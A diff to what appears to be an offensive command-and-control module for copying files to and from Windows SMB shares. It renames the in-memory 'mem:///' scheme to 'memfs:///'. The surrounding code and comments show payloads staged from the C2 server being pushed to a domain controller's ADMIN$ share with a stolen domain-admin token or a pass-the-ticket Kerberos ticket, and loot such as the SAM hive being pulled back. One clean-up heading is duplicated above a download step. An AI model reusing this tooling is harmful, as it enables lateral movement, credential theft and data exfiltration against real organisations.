@@ -21,19 +21,19 @@
 # Token / ticket handling is performed by the module framework before the
 # script starts (agent-side resolveTokenKey), the script itself needs none:
 #
-#     cifs_upload --src mem:///stage.exe \
+#     cifs_upload --src memfs:///stage.exe \
 #                 --dest \\DC01\ADMIN$\Temp\stage.exe \
 #                 --token S-1-5-21-...-1104     # DA token stolen via steal_token
 #
 # …or with a Kerberos ticket (PTT flow) instead of a stolen token:
 #
 #     cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
-#                 --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
+#                 --src memfs:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
 #
 # …and to clean up afterwards:
 #
 #     cifs_download --src \\DC01\ADMIN$\Temp\loot.zip \\
-#                   --dest mem:///loot.zip --token S-1-5-21-...-1104
+#                   --dest memfs:///loot.zip --token S-1-5-21-...-1104
 #
 # …and to clean up afterwards:
 #
@@ -48,7 +48,7 @@
 #     ticket (classic PTT); with a stolen DA token the redirector
 #     authenticates as the DA (Kerberos from that logon session's LSA cache,
 #     or NTLM).
-#   * src may be a mem:/// file (encrypted memfs — best for staged payloads),
+#   * src may be a memfs:/// file (encrypted memfs — best for staged payloads),
 #     an agent-local path, or an http(s):// URL (e.g. the C2's WWWRoot).
 #
 # Kerberos vs NTLM: use the target HOSTNAME (\\DC01.corp.local\...) for
@@ -238,7 +238,7 @@ def effective_identity():
 
 # load_payload fetches the bytes to upload. Supports:
 #   http(s)://…  – http_get
-#   mem:///…     – encrypted memfs (read_file; staged via CC 'put --dst mem:///…')
+#   memfs:///…     – encrypted memfs (read_file; staged via CC 'put --dst memfs:///…')
 #   C:\…         – local file on this agent
 #
 # (downloads have no source-side plumbing: bytes stream straight from the
@@ -253,7 +253,7 @@ def load_payload(src):
         return data, ""
     if not exists(src):
         msg = ("source '%s' not found on this agent — stage it first "
-               + "(CC: 'put --src <local> --dst mem:///...' into memfs) or use an http(s):// URL")
+               + "(CC: 'put --src <local> --dst memfs:///...' into memfs) or use an http(s):// URL")
         return None, msg % src
     data = read_file(src)
     if data == None:
@@ -435,11 +435,11 @@ def stream_read(h, total, chunk):
 
 
 # save_download writes the downloaded bytes to dest via the agent's
-# binary-safe writer. Supports mem:/// (encrypted memfs — retrievable with
+# binary-safe writer. Supports memfs:/// (encrypted memfs — retrievable with
 # CC 'get') and local disk paths. Returns (bytes_written, error).
 def save_download(dest, data):
-    if not (dest.startswith("mem://") or str_contains(dest, ":\\") or str_contains(dest, ":/")):
-        msg = "dest must be a mem:/// path or a local path like C:\\loot.zip (not a UNC path)"
+    if not (dest.startswith("memfs://") or str_contains(dest, ":\\") or str_contains(dest, ":/")):
+        msg = "dest must be a memfs:/// path or a local path like C:\\loot.zip (not a UNC path)"
         print("[-] %s" % msg)
         return 0, msg
     written = write_bytes(dest, data)
@@ -547,7 +547,7 @@ def cmd_upload(args):
             return "Fail: upload finished but verify failed: " + verr
         print("[+] Verified: %d bytes on %s" % (total, dest))
 
-    if delete_src and (src.startswith("mem://") or src.find("://") == -1):
+    if delete_src and (src.startswith("memfs://") or src.find("://") == -1):
         if exists(src):
             remove(src)
             print("[*] Removed source %s" % src)
@@ -586,7 +586,7 @@ def cmd_download(args):
     # Reject a UNC dest before any network I/O: downloads land on this agent.
     if dest.startswith("\\\\"):
         usage()
-        return "Fail: dest must be a mem:/// path or a local path (e.g. mem:///loot.zip or C:\\loot.zip) — not another UNC share"
+        return "Fail: dest must be a memfs:/// path or a local path (e.g. memfs:///loot.zip or C:\\loot.zip) — not another UNC share"
 
     print("[*] cifs_download: %s  ->  %s" % (src, dest))
     who = effective_identity()
@@ -687,12 +687,12 @@ def usage():
     print("    on the target).")
     print("")
     print("  upload:")
-    print("    cifs_upload --src <mem:///file|C:\\path|http(s)://url> \\")
+    print("    cifs_upload --src <memfs:///file|C:\\path|http(s)://url> \\")
     print("                --dest \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe)")
     print("                [--chunk_kb 1024] [--delete_src true] [--verify true]")
     print("  download:")
     print("    cifs_download --src \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\C$\\Windows\\system32\\config\\SAM)")
-    print("                  --dest <mem:///file|C:\\path>  (mem:///loot.zip retrieves it with CC 'get')")
+    print("                  --dest <memfs:///file|C:\\path>  (memfs:///loot.zip retrieves it with CC 'get')")
     print("                  [--chunk_kb 1024] [--verify true]")
     print("  delete:")
     print("    cifs_rm --dest \\\\SERVER\\SHARE\\dir\\file")
